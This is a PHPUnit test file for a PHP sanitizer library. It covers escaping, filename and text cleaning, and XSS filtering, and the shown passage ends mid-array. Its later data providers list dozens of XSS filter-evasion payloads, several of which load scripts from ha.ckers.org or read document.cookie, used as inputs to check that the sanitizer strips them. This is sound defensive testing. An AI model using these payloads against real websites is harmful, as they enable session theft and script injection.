<?php
/**
 * ----------------------------------------------------
 * Created by: PhpStorm.
 * Written by: Camilo Lozano III (Camilo3rd)
 *             www.camilord.com
 *             me@camilord.com
 * Date: 27/05/2018
 * Time: 1:31 AM
 * ----------------------------------------------------
 */

namespace camilord\utilus\Security;

use PHPUnit\Framework\TestCase;
use camilord\utilus\Security\Sanitizer;
use camilord\utilus\IO\SystemUtilus;

class SanitizerTest extends TestCase
{
    /**
     * @param string $strTest
     * @param string $expected
     * @dataProvider getTestDataForRealEscapeString
     */
    public function testRealEscapeString($strTest, $expected) {
        $result = Sanitizer::real_escape_string($strTest);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }

    /**
     * @return array
     */
    public function getTestDataForRealEscapeString() {
        return [
            [ "Ed O''Neil", "Ed O\'\'Neil" ],
            [ "Ed O'Neil", "Ed O\'Neil" ],
            [ "\\", "\\\\" ],
            [ "\x00", "\\0" ],
            [ "\n", "\\n" ],
            [ "\r", "\\r" ],
            [ "'", "\'" ],
            [ '"', '\"' ],
            [ "\x1a", "\Z" ]
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForLoginCleaner
     */
    public function testLoginCleaner($str, $expected) {
        $result = Sanitizer::login_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }

    /**
     * @return array
     */
    public function getTestDataForLoginCleaner() {
        return [
            ['test_!@#$%^&*()_+}{:"?><', 'test__'],
            ['user@sample.com', 'usersample.com'],
            ['~root', 'root']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForEmailCleaner
     */
    public function testEmailCleaner($str, $expected) {
        $result = Sanitizer::email_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForEmailCleaner() {
        return [
            ['test_!@#$%^&*()_+}{:"?><', 'test_@_'],
            ['user@sample.com', 'user@sample.com'],
            ['~root@localhost', 'root@localhost'],
            ['email-user-info@sales.com', 'email-user-info@sales.com']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @param string $expected2
     * @dataProvider getTestDataForSlugger
     */
    public function testSlugger($str, $expected, $expected2) {
        $result = Sanitizer::slugger($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
        $result = Sanitizer::slugger($str, true);
        $this->assertEquals($expected2, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForSlugger() {
        return [
            ['mysql real escape string - is this normal?', 'mysqlrealescapestring-isthisnormal', 'mysql real escape string - is this normal'],
            ['How can I prevent SQL injection in PHP?', 'HowcanIpreventSQLinjectioninPHP', 'How can I prevent SQL injection in PHP'],
            ['How can I capture the result of var_dump to a string?', 'HowcanIcapturetheresultofvar_dumptoastring', 'How can I capture the result of var_dump to a string'],
            ['How do I implement basic “Long Polling”?', 'HowdoIimplementbasicLongPolling', 'How do I implement basic Long Polling'],
            ['How to make a redirect in PHP?', 'HowtomakearedirectinPHP', 'How to make a redirect in PHP'],
            ['Reference — What does this symbol mean in PHP?', 'ReferenceWhatdoesthissymbolmeaninPHP', 'Reference  What does this symbol mean in PHP'],
            ['How do I check if a string contains a specific word?', 'HowdoIcheckifastringcontainsaspecificword', 'How do I check if a string contains a specific word'],
            ['How do you use bcrypt for hashing passwords in PHP?', 'HowdoyouusebcryptforhashingpasswordsinPHP', 'How do you use bcrypt for hashing passwords in PHP'],
            ['SQL injection that gets around mysql_real_escape_string()', 'SQLinjectionthatgetsaroundmysql_real_escape_string', 'SQL injection that gets around mysql_real_escape_string'],
            ['How does PHP \'foreach\' actually work?', 'HowdoesPHPforeachactuallywork', 'How does PHP foreach actually work'],
            ['How to import an SQL file using the command line in MySQL?', 'HowtoimportanSQLfileusingthecommandlineinMySQL', 'How to import an SQL file using the command line in MySQL'],

        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @param string $expected2
     * @dataProvider getTestDataForNumericCleaner
     */
    public function testNumericCleaner($str, $expected, $expected2) {
        $result = Sanitizer::numeric_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
        $result = Sanitizer::numeric_cleaner($str, true);
        $this->assertEquals($expected2, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForNumericCleaner() {
        return [
            ['4289fsad234903cds34.42394', '428923490334.42394', '428923490334.42394'],
            ['-1', '1', '-1'],
            ['-4.6', '4.6', '-4.6'],
            ['213.6000', '213.6000', '213.6000'],
            ['6524.dasd00', '6524.00', '6524.00'],
            ['$10.99', '10.99', '10.99'],
            ['-$11.99', '11.99', '-11.99'],
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @param string $expected2
     * @dataProvider getTestDataForTextCleaner
     */
    public function testTextCleaner($str, $expected, $expected2) {
        $result = Sanitizer::text_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
        $result = Sanitizer::text_cleaner($str, true);
        $this->assertEquals($expected2, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForTextCleaner() {
        return [
            ['vmW{z,D][,aUzc]i)|_6OWEk$LoMZh|uA;$kcEKCUt^%0Fg=.H7xY&|Mt=-GYjry', 'vmWzDaUzci_6OWEkLoMZhuAkcEKCUt0Fg.H7xYMt-GYjry', 'vmWzDaUzci_6OWEkLoMZhuAkcEKCUt0Fg.H7xYMt-GYjry'],
            [';Kcqav^~pLgWO/qbeHy~oJOyo+:@<9=(!Q {}Y,g+z&#6+ w N@Ljy64,#@!.-[L', 'KcqavpLgWOqbeHyoJOyo:9Q Ygz6 w NLjy64.-L', 'KcqavpLgWOqbeHyoJOyo:9Q Ygz6 w NLjy64.-L'],
            ['aA!^EYn_07:J:IYv1-W-SRa|N,m9V7>J - }.SEXuK^WFdPo*q-8B_ty/*>-H)MA', 'aAEYn_07:J:IYv1-W-SRaNm9V7J - .SEXuKWFdPoq-8B_ty-HMA', 'aAEYn_07:J:IYv1-W-SRaNm9V7J - .SEXuKWFdPoq-8B_ty-HMA'],
            ['<>VGTz)rN/]*u{xQ@%~p3!:3<4s3_uS-$o|-snHC+~=.5I.=R=)EP6g/)uh[Dm|j', 'VGTzrNuxQp3:34s3_uS-o-snHC.5I.REP6guhDmj', 'VGTzrNuxQp3:34s3_uS-o-snHC.5I.REP6guhDmj'],
            ['d+SywW/$`=8j2)-%7.vMq^Vl3^8W/,TV;|41nH(BQ2p-&&u}F2A=ax3zVbNPh?N(', 'dSywW8j2-7.vMqVl38WTV41nHBQ2p-uF2Aax3zVbNPhN', 'dSywW8j2-7.vMqVl38WTV41nHBQ2p-uF2Aax3zVbNPhN'],
            ['Ee|P;yk1E)~ht7XFjV+4*(W-2wwy;!eDxN!J6qpfWx|__zym?KG`|Uar;$<2_e`j', 'EePyk1Eht7XFjV4W-2wwyeDxNJ6qpfWx__zymKGUar2_ej', 'EePyk1Eht7XFjV4W-2wwyeDxNJ6qpfWx__zymKGUar2_ej'],
            ['bk59dNWA-|Ba3E3B[YD3d^77%eur-^O;u(PAO4Rv~ps@WH?dzU1tDf)=8OZAw3Xr', 'bk59dNWA-Ba3E3BYD3d77eur-OuPAO4RvpsWHdzU1tDf8OZAw3Xr', 'bk59dNWA-Ba3E3BYD3d77eur-OuPAO4RvpsWHdzU1tDf8OZAw3Xr'],
            ['+},1!47>z};tDtky s;m+VQ4BRTW2{{Rs#m1K=.Q6>`G@@zATH*Aal2-Mr2l/)a3', '147ztDtky smVQ4BRTW2Rsm1K.Q6GzATHAal2-Mr2la3', '147ztDtky smVQ4BRTW2Rsm1K.Q6GzATHAal2-Mr2la3']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @param string $expected2
     * @dataProvider getTestDataForAlphaCleaner
     */
    public function testAlphaCleaner($str, $expected, $expected2) {
        $result = Sanitizer::alpha_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
        $result = Sanitizer::alpha_cleaner($str, true);
        $this->assertEquals($expected2, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForAlphaCleaner() {
        return [
            ['vmW{z,D][,aUzc]i)|_6OWEk$LoMZh|uA;$kcEKCUt^%0Fg=.H7xY&|Mt=-GYjry', 'vmWzDaUzciOWEkLoMZhuAkcEKCUtFgHxYMtGYjry', 'vmWzDaUzciOWEkLoMZhuAkcEKCUtFgHxYMtGYjry'],
            [';Kcqav^~pLgWO/qbeHy~oJOyo+:@<9=(!Q {}Y,g+z&#6+ w N@Ljy64,#@!.-[L', 'KcqavpLgWOqbeHyoJOyoQYgzwNLjyL', 'KcqavpLgWOqbeHyoJOyoQ Ygz w NLjyL'],
            ['aA!^EYn_07:J:IYv1-W-SRa|N,m9V7>J - }.SEXuK^WFdPo*q-8B_ty/*>-H)MA', 'aAEYnJIYvWSRaNmVJSEXuKWFdPoqBtyHMA', 'aAEYnJIYvWSRaNmVJ  SEXuKWFdPoqBtyHMA'],
            ['<>VGTz)rN/]*u{xQ@%~p3!:3<4s3_uS-$o|-snHC+~=.5I.=R=)EP6g/)uh[Dm|j', 'VGTzrNuxQpsuSosnHCIREPguhDmj', 'VGTzrNuxQpsuSosnHCIREPguhDmj'],
            ['d+SywW/$`=8j2)-%7.vMq^Vl3^8W/,TV;|41nH(BQ2p-&&u}F2A=ax3zVbNPh?N(', 'dSywWjvMqVlWTVnHBQpuFAaxzVbNPhN', 'dSywWjvMqVlWTVnHBQpuFAaxzVbNPhN'],
            ['Ee|P;yk1E)~ht7XFjV+4*(W-2wwy;!eDxN!J6qpfWx|__zym?KG`|Uar;$<2_e`j', 'EePykEhtXFjVWwwyeDxNJqpfWxzymKGUarej', 'EePykEhtXFjVWwwyeDxNJqpfWxzymKGUarej'],
            ['bk59dNWA-|Ba3E3B[YD3d^77%eur-^O;u(PAO4Rv~ps@WH?dzU1tDf)=8OZAw3Xr', 'bkdNWABaEBYDdeurOuPAORvpsWHdzUtDfOZAwXr', 'bkdNWABaEBYDdeurOuPAORvpsWHdzUtDfOZAwXr'],
            ['+},1!47>z};tDtky s;m+VQ4BRTW2{{Rs#m1K=.Q6>`G@@zATH*Aal2-Mr2l/)a3', 'ztDtkysmVQBRTWRsmKQGzATHAalMrla', 'ztDtky smVQBRTWRsmKQGzATHAalMrla']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForAlphaNumericCleaner
     */
    public function testAlphaNumericCleaner($str, $expected) {
        $result = Sanitizer::alphanumeric_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForAlphaNumericCleaner() {
        return [
            ['vmW{z,D][,aUzc]i)|_6OWEk$LoMZh|uA;$kcEKCUt^%0Fg=.H7xY&|Mt=-GYjry', 'vmWzDaUzci6OWEkLoMZhuAkcEKCUt0FgH7xYMtGYjry'],
            [';Kcqav^~pLgWO/qbeHy~oJOyo+:@<9=(!Q {}Y,g+z&#6+ w N@Ljy64,#@!.-[L', 'KcqavpLgWOqbeHyoJOyo9QYgz6wNLjy64L'],
            ['aA!^EYn_07:J:IYv1-W-SRa|N,m9V7>J - }.SEXuK^WFdPo*q-8B_ty/*>-H)MA', 'aAEYn07JIYv1WSRaNm9V7JSEXuKWFdPoq8BtyHMA'],
            ['<>VGTz)rN/]*u{xQ@%~p3!:3<4s3_uS-$o|-snHC+~=.5I.=R=)EP6g/)uh[Dm|j', 'VGTzrNuxQp334s3uSosnHC5IREP6guhDmj'],
            ['d+SywW/$`=8j2)-%7.vMq^Vl3^8W/,TV;|41nH(BQ2p-&&u}F2A=ax3zVbNPh?N(', 'dSywW8j27vMqVl38WTV41nHBQ2puF2Aax3zVbNPhN'],
            ['Ee|P;yk1E)~ht7XFjV+4*(W-2wwy;!eDxN!J6qpfWx|__zym?KG`|Uar;$<2_e`j', 'EePyk1Eht7XFjV4W2wwyeDxNJ6qpfWxzymKGUar2ej'],
            ['bk59dNWA-|Ba3E3B[YD3d^77%eur-^O;u(PAO4Rv~ps@WH?dzU1tDf)=8OZAw3Xr', 'bk59dNWABa3E3BYD3d77eurOuPAO4RvpsWHdzU1tDf8OZAw3Xr'],
            ['+},1!47>z};tDtky s;m+VQ4BRTW2{{Rs#m1K=.Q6>`G@@zATH*Aal2-Mr2l/)a3', '147ztDtkysmVQ4BRTW2Rsm1KQ6GzATHAal2Mr2la3']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForStringFilter
     */
    public function testStringFilter($str, $expected) {
        $result = Sanitizer::stringFilter($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForStringFilter() {
        return [
            ['vmW{z,D][,aUzc]i)|_6OWEk$LoMZh|uA;$kcEKCUt^%0Fg=.H7xY&|Mt=-GYjry', 'vmWzDaUzci)_6OWEk$LoMZhuA$kcEKCUt%0Fg.H7xY&Mt-GYjry'],
            [';Kcqav^~pLgWO/qbeHy~oJOyo+:@<9=(!Q {}Y,g+z&#6+ w N@Ljy64,#@!.-[L', 'KcqavpLgWOqbeHyoJOyo:@9(Q Ygz&#6 w N@Ljy64#@.-L'],
            ['aA!^EYn_07:J:IYv1-W-SRa|N,m9V7>J - }.SEXuK^WFdPo*q-8B_ty/*>-H)MA', 'aAEYn_07:J:IYv1-W-SRaNm9V7J - .SEXuKWFdPo*q-8B_ty*-H)MA'],
            ['<>VGTz)rN/]*u{xQ@%~p3!:3<4s3_uS-$o|-snHC+~=.5I.=R=)EP6g/)uh[Dm|j', 'VGTz)rN*uxQ@%p3:34s3_uS-$o-snHC.5I.R)EP6g)uhDmj'],
            ['d+SywW/$`=8j2)-%7.vMq^Vl3^8W/,TV;|41nH(BQ2p-&&u}F2A=ax3zVbNPh?N(', 'dSywW$8j2)-%7.vMqVl38WTV41nH(BQ2p-&&uF2Aax3zVbNPhN('],
            ['Ee|P;yk1E)~ht7XFjV+4*(W-2wwy;!eDxN!J6qpfWx|__zym?KG`|Uar;$<2_e`j', 'EePyk1E)ht7XFjV4*(W-2wwyeDxNJ6qpfWx__zymKGUar$2_ej'],
            ['bk59dNWA-|Ba3E3B[YD3d^77%eur-^O;u(PAO4Rv~ps@WH?dzU1tDf)=8OZAw3Xr', 'bk59dNWA-Ba3E3BYD3d77%eur-Ou(PAO4Rvps@WHdzU1tDf)8OZAw3Xr'],
            ['+},1!47>z};tDtky s;m+VQ4BRTW2{{Rs#m1K=.Q6>`G@@zATH*Aal2-Mr2l/)a3', '147ztDtky smVQ4BRTW2Rs#m1K.Q6G@@zATH*Aal2-Mr2l)a3']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForFloatFilter
     */
    public function testFloatFilter($str, $expected) {
        $result = Sanitizer::floatFilter($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForFloatFilter() {
        return [
            [423.4324242342423424, '42343242423424'],
            [3.14161416141614161416, '31416141614161'],
            [3.11112, '311112'],
            [3.3333, '33333'],
            ['3.33333x', '333333'],
            [-423.4324242342423424, '-42343242423424'],
            [-3.14161416141614161416, '-31416141614161'],
            [-3.11112, '-311112'],
            [-3.3333, '-33333'],
            ['-3.33333x', '-333333']
        ];
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForFilenameCleaner
     */
    public function testFilenameCleaner($str, $expected) {
        $result = Sanitizer::filename_cleaner($str);
        $this->assertEquals($expected, $result, $result.' != '.$expected);
    }
    /**
     * @return array
     */
    public function getTestDataForFilenameCleaner() {
        return [
            ['test_@filename-:xx.txt', 'test_filename-xx.txt'],
            ['Grant-proposal-henry-edits-finalfinal.doc', 'Grant-proposal-henry-edits-finalfinal.doc'],
            ['Grant-proposal-final-Nora_edits_v4.doc', 'Grant-proposal-final-Nora_edits_v4.doc'],
            ['FINAL_proposal_Aug2016_kct-updated.doc', 'FINAL_proposal_Aug2016_kct-updated.doc'],
            ['[YYMMDD]_[Project]_[Country]_[Event]-[number].xxx', 'YYMMDD_Project_Country_Event-number.xxx'],
            ['2011.11.11-kampala-riot-000002.tiff','2011.11.11-kampala-riot-000002.tiff'],
            ['test[~!@#$%^&*()`;<>?,[:|]{}‘”]-402937.tar.gz','test-402937.tar.gz']
        ];
    }

    public function testWhitespaces() {
        $expected = 'x x dsadadada 49302742';
        $result = Sanitizer::whitespaces("x          x\n\n\n\ndsadadada\n\n49302742");
        $this->assertEquals($expected, $result);
    }

    /**
     * @param string $str
     * @param string $expected
     * @dataProvider getTestDataForTextNormalize
     */
    public function testTextNormalize($str, $expected, $expected2)
    {
        if (SystemUtilus::isWin32()) {
            $result = Sanitizer::text_normalizer($str);
            $this->assertEquals($expected, $result, $result.' != '.$expected);

            $result = Sanitizer::text_normalizer($str, true);
            $this->assertEquals($expected, $result, $result.' != '.$expected);
        } else {
            $result = Sanitizer::text_normalizer($str);
            $this->assertEquals($expected2, $result, $result.' != '.$expected);

            $result = Sanitizer::text_normalizer($str, true);
            $this->assertEquals($expected2, $result, $result.' != '.$expected);
        }
    }
    /**
     * @return array
     */
    public function getTestDataForTextNormalize() {
        return [
            [
                "“Te Keteparaha Mo Ng? Papak?inga – M?ori Housing Toolkit”                 while ensuring that minimum design standards",
                '"Te Keteparaha Mo Ng? Papak?inga - M?ori Housing Toolkit" while ensuring that minimum design standards',
                '"Te Keteparaha Mo Ng? Papak?inga - M?ori Housing Toolkit" while ensuring that minimum design standards'
            ],
            [
                'â€œTe Keteparaha Mo Ng? Papak?inga â€“ M?ori        Housing Toolkitâ€',
                'aEURoeTe Keteparaha Mo Ng? Papak?inga aEUR" M?ori Housing ToolkitaEUR',
                'aEURoeTe Keteparaha Mo Ng? Papak?inga aEUR" M?ori Housing ToolkitaEUR'
            ],
            [
                'AWTSâ€™s             servicing places of assembly',
                'AWTSaEURTMs servicing places of assembly',
                'AWTSaEUR(TM)s servicing places of assembly'
            ],
            [
                'Disposal Site and          Soil Evaluation Checklistâ€™.',
                'Disposal Site and Soil Evaluation ChecklistaEURTM.',
                'Disposal Site and Soil Evaluation ChecklistaEUR(TM).'
            ]
        ];
    }

    /**
     * @param string $data
     * @param string $expected
     * @dataProvider getTestData
     */
    public function testCommonXSSAttack($data, $expected)
    {
        $result = Sanitizer::xss_clean($data);
        if (is_array($result)) {
            foreach($result as $item) {
                $this->assertContains($item, $expected);
                $this->assertFalse($this->detectXSS($item), '[ '.$item.' ] IS NOT CLEAN!');
            }
        } else {
            $this->assertEquals($result, $expected);
            $this->assertFalse($this->detectXSS($result), '[ '.$result.' ] IS NOT CLEAN!');
        }
    }
    /**
     * @param string $data
     * @param string $expected
     * @dataProvider getTestData
     */
    public function testCommonXSSAttack2($data, $expected)
    {
        $result = Sanitizer::xss_clean($data, 'ISO-8859-15');
        if (is_array($result)) {
            foreach($result as $item) {
                $this->assertContains($item, $expected);
                $this->assertFalse($this->detectXSS($item), '[ '.$item.' ] IS NOT CLEAN!');
            }
        } else {
            $this->assertEquals($result, $expected);
            $this->assertFalse($this->detectXSS($result), '[ '.$result.' ] IS NOT CLEAN!');
        }
    }
    /**
     * @return array
     */
    public function getTestData() {
        return [
            [ '<script>alert("You have been hacked!");</script>', 'alert(&quot;You have been hacked!&quot;);' ],
            [ '<span style="font-size: 1px;">hello small world!</span>', '&lt;span&gt;hello small world!&lt;/span&gt;' ],
            [['<script>location.href="http://pornhub.com";</script>',"hello world\x00!!!"], ['location.href=&quot;http://pornhub.com&quot;;', 'hello world!!!']]
        ];
    }

    /**
     * @param $testString
     * @param $expected
     * @dataProvider workingStringsProvider
     */
    public function testWorkingStrings($testString, $expected)
    {
        $result = Sanitizer::xss_clean($testString);
        $this->assertEquals( $expected, $result, 'These strings are safe and should be returned without modification' );
        $this->assertFalse($this->detectXSS($result), '[ '.$result.' ] IS NOT CLEAN!');
    }

    /**
     * @return array
     */
    public function workingStringsProvider()
    {
        // these strings should be returned without modification - they are not attacks
        return array(
            array('<Pass+word!@#$%^&*()-/\\>', '' ),
            array('<div><strong><p>acceptable markup</p><p>should be left alone</p></strong></div>', 'acceptable markupshould be left alone'),
            array('<div>but what about broken markup</div', 'but what about broken markup'),
            array(
                'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed malesuada nec ex eu volutpat. Vestibulum varius odio a congue sagittis.',
                'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed malesuada nec ex eu volutpat. Vestibulum varius odio a congue sagittis.'
            ),
            array( 'https://www.securewebaddress.com', 'https://www.securewebaddress.com' ),
            array( 'http://www.httpwebaddress.com', 'http://www.httpwebaddress.com'),
            array( 'http://www.web.com/default.asp?TEST=foo&MSG=URL%20ECODED%20STUFF%20get%20variables.', 'http://www.web.com/default.asp?TEST=foo&MSG=URL%20ECODED%20STUFF%20get%20variables.' ),
        );
    }

    /**
     * @param string $attackVector
     * @param string $expected
     * @dataProvider attackVectorProvider
     */
    public function testXssClean($attackVector, $expected)
    {
        $result = Sanitizer::xss_clean($attackVector);
        $this->assertEquals($expected, $result, 'We expect the vector to be cleaned');
        $this->assertFalse($this->detectXSS($result), '[ '.$result.' ] IS NOT CLEAN!');
    }

    public function attackVectorProvider()
    {
        // see https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
        return array(
            array( '<iframe src="javascript:alert(\'Xss\')";></iframe>', '' ),
            array( "'';!--\"<XSS>=&{()}", '&#039;&#039;;!--&quot;=&{()}' ),
            array( '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>', '' ),
            array( '<IMG SRC="javascript:alert(\'XSS\');">', '' ),
            array( '<IMG SRC=javascript:alert(\'XSS\')>', '' ),
            array( '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>', '' ),
            array( '<IMG SRC=javascript:alert(\"XSS\")>', '' ),
            array( '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>', '' ),
            array( '<a onmouseover="alert(document.cookie)">xxs link</a>', 'xxs link' ),
            array( '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">', '' ),
            array( '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', '' ),
            array( '<IMG SRC=# onmouseover="alert(\'xxs\')">', '' ),
            array( '<IMG SRC= onmouseover="alert(\'xxs\')">', '' ),
            array( '<IMG onmouseover="alert(\'xxs\')">', '' ),
            array( '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', '' ),
            array( '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>', '' ),
            array( '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>', '' ),
            array( '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>', '' ),
            array( '<IMG SRC="jav  ascript:alert(\'XSS\');">', '' ),
            array( '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">', '' ),
            array( '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">', '' ),
            array( '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">', '' ),
            array( "<IMG SRC=java\0script:alert(\"XSS\")>", '' ),
            array( '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">', '' ),
            array( '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>', '' ),
            array( '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '' ),
            array( '<<SCRIPT>alert("XSS");//<</SCRIPT>', '' ),
            array( '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >', '' ),
            array( '<SCRIPT SRC=//ha.ckers.org/.j>', '' ),
            array( '<IMG SRC="javascript:alert(\'XSS\')"', '' ),
            array( '\";alert(\'XSS\');//', '\&quot;;alert(&#039;XSS&#039;);//' ),
            array( '</TITLE><SCRIPT>alert("XSS");</SCRIPT>', 'alert(&quot;XSS&quot;);' ),
            array( '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">', '' ),
            array( '<BODY BACKGROUND="javascript:alert(\'XSS\')">', '' ),
            array( '<IMG DYNSRC="javascript:alert(\'XSS\')">', '' ),
            array( '<IMG LOWSRC="javascript:alert(\'XSS\')">', '' ),
            array( '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>', 'li {list-style-image: url(&quot;&#039;XSS&#039;)&quot;);}&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;' ),
            array( '<IMG SRC=\'vbscript:msgbox("XSS")\'>', '' ),
            array( '<IMG SRC="livescript:[code]">', '' ),
            array( '<BODY ONLOAD=alert(\'XSS\')>', '' ),
            array( 'onClick(alert(\'XSS\'))', 'onClick(alert(&#039;XSS&#039;))' ),   // not using all of the on variations
            array( '<BGSOUND SRC="javascript:alert(\'XSS\');">', '' ),
            array( '<BR SIZE="&{alert(\'XSS\')}">', '&lt;BR SIZE=&quot;&{alert(&#039;XSS&#039;)}&quot;&gt;' ),
            array( '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">', '' ),
            array( '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">', '' ),
            array( '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>', '@import&#039;http://ha.ckers.org/xss.css&#039;;' ),
            array( '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">', '' ),
            array( '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>', 'BODY{url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}' ),
            array( '<STYLE>@im\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>', '@im\port&#039;\ja\vasc\ript:alert(&quot;XSS&quot;)&#039;;' ),
            array( '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">', '' ),
            array( 'exp/*<A STYLE=\'no\xss:noxss("*//*");', 'exp/*' ),
            array( '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>', 'alert(&#039;XSS&#039;);' ),
            array( '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>', '.XSS{background-image:url(&quot;&#039;XSS&#039;)&quot;);}' ),
            array( '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>', 'BODY{background:url(&quot;&#039;XSS&#039;)&quot;)}' ),
            array( '<XSS STYLE="xss:expression(alert(\'XSS\'))">', '' ),
            array( '<XSS STYLE="behavior: url(xss.htc);">', '' ),
            array( '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">', '' ),
            array( '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', '' ),
            array( '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">', '' ),
            array( '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>', '' ),
            array( '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>', '' ),
            array( '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>', '' ),
            array( '<TABLE BACKGROUND="javascript:alert(\'XSS\')">', '' ),
            array( '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">', '' ),
            array( '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">', '' ),
            array( '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">', '' ),
            array( '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">', '' ),
            array( '<DIV STYLE="width: expression(alert(\'XSS\'));">', '' ),
            array( '<BASE HREF="javascript:alert(\'XSS\');//">', '' ),
            array( '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>', '' ),
            array( 'EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf" AllowScriptAccess="always"></EMBED>', 'EMBED SRC=&quot;http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;' ),
